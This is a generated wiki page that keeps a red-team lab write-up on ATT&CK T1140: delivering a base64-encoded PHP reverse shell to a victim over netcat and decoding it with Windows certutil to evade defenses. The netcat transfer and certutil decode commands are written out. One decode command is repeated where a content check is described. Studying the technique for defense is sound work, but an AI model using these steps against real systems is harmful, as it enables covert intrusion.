---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Encode/Decode Data with Certutil

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-defense-evasion-t1140-encode-decode-data-with-certutil` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/t1140-encode-decode-data-with-certutil.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Encode/Decode Data with Certutil](../../topics/offensive-security/encode-decode-data-with-certutil.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-defense-evasion-t1140-encode-decode-data-with-certutil |
| name | Encode/Decode Data with Certutil |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/defense-evasion/t1140-encode-decode-data-with-certutil.md |

## Preserved Source Material

````yaml
_asset_filenames:
- certutil-decoded.png
- certutil-encoded.png
- certutil-shellphp.png
_body: '---

  description: Defense Evasion

  ---


  # Encode/Decode Data with Certutil


  In this lab I will transfer a base64 encoded php reverse shell from my attacking machine to the victim machine via netcat
  and decode the data on the victim system using a native windows binary `certutil`.


  ## Execution


  Preview of the content to be encoded on the attacking system:


  ![](../../.gitbook/assets/certutil-shellphp.png)


  Sending the above shell as a base64 encoded string to the victim system \(victim is listening and waiting for the file with
  `nc -l 4444 > enc`\):


  {% code title="attacker@local" %}

  ```csharp

  base64 < shell.php.gif | nc 10.0.0.2 4444

  ```

  {% endcode %}


  Once the file is received on the victim, let''s check its contents:


  {% code title="attacker@victim" %}

  ```csharp

  certutil.exe -decode .\enc dec

  ```

  {% endcode %}


  ![](../../.gitbook/assets/certutil-encoded.png)


  Let''s decode the data:


  {% code title="attacker@victim" %}

  ```csharp

  certutil.exe -decode .\enc dec

  ```

  {% endcode %}


  Let''s have a look at the contents of the file `dec` which now contains the base64 decoded shell:


  ![](../../.gitbook/assets/certutil-decoded.png)


  ## References


  {% embed url="https://attack.mitre.org/wiki/Technique/T1140" %}'
_relative_path: offensive-security/defense-evasion/t1140-encode-decode-data-with-certutil.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/defense-evasion/t1140-encode-decode-data-with-certutil.md
````
